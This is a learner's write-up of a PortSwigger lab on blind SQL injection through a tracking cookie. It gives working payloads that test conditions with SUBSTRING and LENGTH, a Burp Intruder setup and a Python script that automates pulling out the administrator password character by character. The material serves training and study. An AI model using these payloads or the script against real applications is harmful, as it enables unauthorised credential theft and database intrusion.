# Blind SQL injection with conditional responses

**Category:** Web Exploitation — SQL Injection  
**Difficulty:** Practitioner
**Progress:** Solved

---

## Description

**Lab URL:** `https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses`

 This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.

The results of the SQL query are not returned, and no error messages are displayed. But the application includes a Welcome back message in the page if the query returns any rows.

The database contains a different table called users, with columns called username and password. You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user.

To solve the lab, log in as the administrator user. 

Hint:
You can assume that the password only contains lowercase, alphanumeric characters.


---

## Reconnaissance

- What does the application do? 
    - Still the same basic shop website
- Where is user input accepted? (forms, URL parameters, headers, cookies)
    - there is no input field (account login is back) but the user can input text into the url as before. The real input for the sqli happens in the cookie though.
- What happens with normal input?
    - inputting a normal word instead of the given categories prints the word on the page and shows no results, inputting the given categories works like it should

---

## Analysis

#### Technology Stack
```
Database:   PostgreSQL, MySQL or MSSQL (Microsoft)
Input:      URL
Behavior:   Blind SQL Injection
```

#### Vulnerability

- What exactly is vulnerable and why?
    
As per the lab instructions the cookie containing a `TrackingId` is vulnerable.
The sql in the background probably looks like this:
```sql
select TrackingId FROM TrackedUsers WHERE TrackingID = [Input]
```
This works like it should if there is just a TrackingId in the cookie, but if an Attacker puts sql in there this is unsafe.

---

## Solution

### Step 0 - Recreating the lesson

Inputting the same command as shown in the lesson:
```sql
TrackingId=imtScU527IPsct1X' AND '1'='1
```
indeed returns a 'Welcome back' message.

---
### Step 1 - Fingeprinting the database

Not subject of this lab, but can be done by trying different synax and see which reply crashes/stays alive.

---

### Step 2 - Enumeration

Since this is a blind injection the only way to get the wanted password is to enumerate it step by step.


```sql
TrackingId=vqyIHyT1Y5O7AK60' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 1, 1) > 'a'-- -;
```
Substring() takes 3 arguements - the string, the first position and the length to take a substring from. So in this case it takes a look at the very first letter.
If this returns the 'Welcome back' message then the first letter could be any letter besides `a`. In this case it did not, so `<a` had to be tried. This returned the 'Welcome back' message. Meaning the first character of the password is a number (0-9). Finally

```sql
TrackingId=vqyIHyT1Y5O7AK60' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 1, 1) = '1'-- -;
```
was a hit. So the first character of the password is 1. If `<a` also did not return the 'Welcome back' message then the first character of the password would have to be `a` itself.

One more thing to check, before all of this will be fed into the Intruder so it doesn't need to be done by hand, is the length of the password.
The request should look like this:
```sql
TrackingId=vqyIHyT1Y5O7AK60' AND LENGTH((SELECT password FROM users WHERE username = 'administrator')) > 10 -- -;
```
Using the same technique as above -> the length of the admin password is 20.



### Step 3 - Extract / Exploit
Now using the Intruder we need to set it up correctly.
This is how the Intruder takes our payload. § is like a bracket around whatever value we want to change. In this case the first number in the substring method needs to go up since we got 20 characters in the password. And the value we comapre against needs to be a-z0-9 so we have to set that payload up seperately. The cluster bomb attack is used since the payload has multiple variable positions. Otherwise the Sniper attack would have worked. 
```sql
xyz' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'),§1§ , 1) = '§a§'-- -
```
Important here that `administrator` is lowercase, otherwise intruder will not find any 'Welcome Back's.
The password in the end is: xpgpxa1hdehptkz0ehs1
The problem is, the Intruder ran for so long that I went away and when it finished and I did not comeback the lab closed due to inactivity. 
So the new solution is to build a python script to get the password a bit quicker.


```python

import requests, string              # requests to send requests, get responses etc.
url ="https://0a8d006003ab6d3e804d674800040027.web-security-academy.net/filter"
chars = string.ascii_lowercase + string.digits        #a-z0-9
password = ""

for pos in range(1, 21):
    for c in chars:
        payload = f"' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),{pos},1)='{c}'-- -"  # same idea as burp intruder
        r = requests.get(url,
                        params={"category": "Gifts"},
                        cookies={"TrackingId": "kJBYV1qQLcQyHJdd" + payload,
                                  "session": "YOUR-SESSION"})
        if "Welcome back" in r.text:
            password += c
            break
print("Password:", password)
```

The password this time around is: syppqagonu64cnclq125


---

## Real World Impact

Even if the application does not return a lot of info to an attacker it can still be a major security flaw. This attack perfectly demonstrates that - only minor information leaks leading to the same exploitation earlier sqlinjections had.

---

## Learnings

- Burp Intruder is good - but scripting it in python is even faster (burp community is not quick enough)
- Binary search instead of iteration is needed for bigger, more complex tasks
- blind injection does not really mean blind. Even a yes/no response is enough information to exploit a target.
